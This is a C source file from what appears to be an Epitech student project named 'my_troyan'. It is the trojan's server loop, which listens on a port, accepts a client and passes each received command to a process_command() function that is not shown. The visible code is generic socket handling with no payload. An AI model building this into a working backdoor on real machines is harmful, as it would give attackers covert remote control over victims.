/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 app_start.c
*/

#include "app.h"
#include <sys/select.h>

bool loop = true;

static int client_connect(server_t *server)
{
    if (socket_server_connect(&server->client, server->sock.fd))
        return EXIT_FAILURE;
    server->client_connected = true;
    write_in_log("Client connected\n");
    return EXIT_SUCCESS;
}

static int process_request(server_t *server)
{
    char *command;

    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        command = socket_receive(&server->client);
        if (!command)
            return EXIT_FAILURE;
        write_in_log("Command received\n");
        if (process_command(command, &server->client))
            return EXIT_FAILURE;
        free(command);
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (client_connect(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

static int app_loop(server_t *server)
{
    socket_t *client;
    int status = EXIT_SUCCESS;

    write_in_log("Start app\n");
    while (loop) {
        client = (server->client_connected) ? &server->client : NULL;
        if (socket_server_select(&server->select, client, &server->sock)) {
            status = EXIT_FAILURE;
            break;
        }
        if (server->select.status != 0) {
            if (process_request(server) == EXIT_FAILURE) {
                status = EXIT_FAILURE;
                break;
            }
        }
    }
    write_in_log("Stop app\n");
    return status;
}

int app_start(void)
{
    server_t server;

    server.client_connected = false;
    if (socket_server_create(&server.sock, PORT, MAX_CLIENT))
        return EXIT_FAILURE;
    if (signal_init() == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (app_loop(&server) == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (server.client_connected) {
        if (socket_close(&server.client) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    if (socket_close(&server.sock) == EXIT_FAILURE)
        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}